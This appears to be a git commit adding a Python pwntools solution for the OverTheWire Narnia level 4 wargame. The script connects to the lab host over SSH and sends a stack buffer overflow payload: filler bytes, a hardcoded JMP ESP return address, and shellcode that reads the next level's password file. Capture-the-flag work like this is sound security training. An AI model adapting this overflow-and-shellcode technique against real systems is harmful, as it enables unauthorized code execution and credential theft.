e465ddc8d232da0a7d5e0145f679c3565c3a7248
Brad Campbell <bcampbell1120@gmail.com>
2019-08-16 21:54:30 -0400

    Added narnia4 solution

---
+++ Narnia/narnia4/narnia4.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python2
+from __future__ import print_function
+import pwn
+import getpass
+import sys
+import struct
+
+# Configuration variables
+config = {
+        'user': 'narnia4',
+        'executable': '/narnia/narnia4',
+        'password_file_path': '/etc/narnia_pass/narnia5',
+        'host': 'narnia.labs.overthewire.org',
+        'port': 2226
+        }
+pwn.context.arch = 'i386'
+pwn.context.os = 'linux'
+
+# Get password for SSH login
+try:
+    password = getpass.getpass(prompt='{} password: '.format(config['user']))
+except Exception as e:
+    print('[-] Error getting password: ' + e)
+    sys.exit(-1)
+
+# Login to SSH
+s = pwn.tubes.ssh.ssh(host=config['host'],
+                      port=config['port'],
+                      user=config['user'],
+                      password=password)
+
+# Overwrite function stack space
+locals_len = 264
+local_vars = '\xCC' * locals_len
+
+# Location of jmp esp in libc
+# TODO Automate retrieval of a valid JMP ESP as an exercise
+jmp_esp = struct.pack('<L', 0xf7ff73c7)
+
+asm = pwn.shellcraft.i386.linux.cat(config['password_file_path'])
+shellcode = pwn.asm(asm)
+
+# locals(128 byte char buffer + EBP) + jmp_esp(EIP) + Shellcode on stack
+payload = local_vars + jmp_esp + shellcode
+
+p = s.process(argv=[config['executable'], payload],
+              raw=True)
+print('Narnia5 password: {}'.format(p.recvall()))
+p.close()
+s.close()
